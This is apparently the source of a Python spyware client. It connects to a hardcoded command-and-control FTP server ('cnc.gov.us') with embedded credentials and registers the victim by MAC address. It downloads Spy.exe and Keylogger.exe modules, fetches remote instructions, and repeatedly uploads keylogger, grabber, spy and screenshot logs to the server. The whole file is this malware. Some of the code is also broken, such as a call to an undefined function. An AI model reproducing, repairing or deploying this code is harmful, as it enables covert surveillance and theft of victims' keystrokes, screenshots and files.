import os
import subprocess
import urllib
import time
import shutil
import socket
import ftplib
from ftplib import FTP_TLS
from uuid import getnode as get_mac

ip = "cnc.gov.us"
user_name = "client_cnc"
password = "q1w2e3r4"

hard = 0

def download(filename):
    local_filename = filename
    lf = open(local_filename, 'wb')
    ftps.retrbinary('RETR %s' % filename, lf.write)
    lf.close()
    return 1

def download_ksb(filename):
    local_filename = "Config.txt"
    lf = open(local_filename, 'wb')
    ftps.retrbinary('RETR %s' % filename, lf.write)
    lf.close()
    return 1

def upload(filename):
    myfile = open(filename, 'rb')
    ftps.storbinary('STOR %s' % filename, myfile)
    myfile.close()
    return 1

def upload_directory(dirname):
    listforsend = []
    for file in os.listdir(dirname):
        path = os.path.join(dirname, file)
        if not os.path.isdir(path):
            sendfile = open(path, 'rb')
            ftps.storbinary('STOR %s' % file, sendfile)
            sendfile.close()
            time.sleep(1)
        else:
            ftps.mkd(file)
            ftps.cwd(file)
            sendfolder(path)

def registration():
    mac = get_mac()
    registration_file = "registration.conf"
    rf = open(registration_file, 'wb')
    rf.write(str(mac))
    rf.close()
    ftps.mkd('%s' % mac)
    return 1   

def check_dir_on_ftp(namedir):
    filelist = []
    ftps.retrlines('LIST',filelist.append)  
    f = 0
    fl = 0
    for f in filelist:
        if namedir in f:
            f = 1
            fl = 1
    return fl

def check_file(namefile):
    if os.path.isfile(namefile):
        return 1
    else:
        return 0

def get_client_name():
    registration_file = "registration.conf"
    rf = open(registration_file, 'r')
    myname = rf.readline()
    rf.close()
    return myname

def check_first_connection():
    registration_file = "registration.conf"
    fl = 0
    check = check_file(registration_file)
    if check == 1:
        rf = open(registration_file, 'r')
        home_dir = rf.readline()
        rf.close()
        flag = check_dir_on_ftp(home_dir)
        if flag == 0:
            registration()
            fl = 1
        if flag == 1:
            fl = 1
    if check == 0:
        mac = get_mac()
        flag = check_dir_on_ftp(str(mac))
        if flag == 0:
            registration()
            check_or_download_modules()
            fl = 1
        if flag == 1:
            registration_file = "registration.conf"
            rf = open(registration_file, 'wb')
            rf.write(str(mac))
            rf.close()
            fl = 1
    return fl

def check_or_download_modules():
    check = 0
    fl1 = 0
    fl2 = 0
    fl3 = 0
    while check == 0:
        check = check_dir_on_ftp("modules")
    ftps.cwd("/modules/")
    if not os.path.exists("Spy.exe"):
        while fl1 == 0:
            fl1 = check_dir_on_ftp("Spy.exe")
            time.sleep(3)
        download("Spy.exe")
    if not os.path.exists("pthreadVSE2.dll"):
        while fl2 == 0:
            fl2 = check_dir_on_ftp("pthreadVSE2.dll")
            time.sleep(3)
        download("pthreadVSE2.dll")
    if not os.path.exists("Keylogger.exe"):
        while fl3 == 0:
            fl3 = check_dir_on_ftp("Keylogger.exe")
            time.sleep(3)
        download("Keylogger.exe")
    ftps.cwd("/")

def check_work():
    shutil.copy("Config.ksb","Config.txt")
    myfile = open("Config.txt", 'r')
    c = myfile.readline()
    myfile.close()
    return int(c)

def check_screen():
    shutil.copy("Config.ksb","Config.txt")
    count = 15
    myfile = open("Config.txt", 'r')
    while count != 0:
        c = myfile.readline()
        count = count - 1
    myfile.close()
    return int(c)

def upload_logs_on_server(my_name):
    fl = 0
    while fl == 0:
    	fl = check_dir_on_ftp(my_name)
        time.sleep(15)
    ftps.cwd('/' + my_name)
    check = check_dir_on_ftp("logs")
    if check == 0:
        ftps.mkd('/' + my_name + '/logs/')
    ftps.cwd('/' + my_name + '/logs/')
    upload_directory('GrabberLog')
    upload_directory('KeyloggerLog')
    upload_directory('SpyLog')
    c1 = check_work()
    c2 = check_screen()
    if c1 + c2 == 2:
        lf = open("transmit/request", 'wb')
        lf.close()
        c = 0
        while c == 0:
            c = os.path.exists("Transmit/confirm")
        upload_directory('ScreenshooterLog')
        os.remove("Transmit/confirm")
        lf = open("transmit/finish", 'wb')
        lf.close()
        ftps.cwd("/")
    return 1

def download_instruction(my_name):
    ftps.cwd('/' + my_name)
    check = 0
    fl = 0
    while check == 0:
        check = check_dir_on_ftp("instructions")
        time.sleep(5)
    ftps.cwd('/' + my_name + '/instructions/')
    while fl == 0:
        fl = check_dir_on_ftp("Config.ksb")
        time.sleep(5)
    download_ksb("Config.ksb")
    ftps.cwd("/")
    return 1

def start_module(name_module):
    PIPE = subprocess.PIPE
    p = subprocess.Popen([name_module, r'/?'], stdout=subprocess.PIPE)
    return 1

def start_or_not(hard):
    c = check_work()
    if hard == 0:
        if c == 1:
            hard = 1
            start_module("Spy.exe")
        if c == 0:
            hard = 0
    if hard == 1:
        if c == 1:
            hard = 1
        if c == 0:
            hard = 0
    return hard

def correct_config_file():
    if os.path.exists("Config.ksb"):
        os.remove("Config.ksb")
    rf = open("Config.txt", 'r')
    wf = open("Config.ksb", 'w')
    i = 15
    while i != 0:
        ch = rf.readline()
        wf.write(ch)
        i = i - 1
    ch = rf.read(1)
    wf.write(ch)
    rf.close()
    wf.close()
    return 1

def check_conn(ip):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    result = sock.connect_ex((ip,21))
    if result == 0:
        return 1
    else:
        return 0

ftps = FTP_TLS(ip)
ftps.login(user_name, password)
ftps.prot_p()
check_first_connection()
check_or_download_modules()
my_name = get_client_name()
gen = 0
while gen == 0:
    download_instruction(my_name)
    correct_config_file()
    hard = start_or_not(hard)
    time.sleep(5)
    if hard == 1:
        time.sleep(25)
        upload_logs_on_server(my_name)
    time.sleep(1)
ftps.quit()
ftps.close()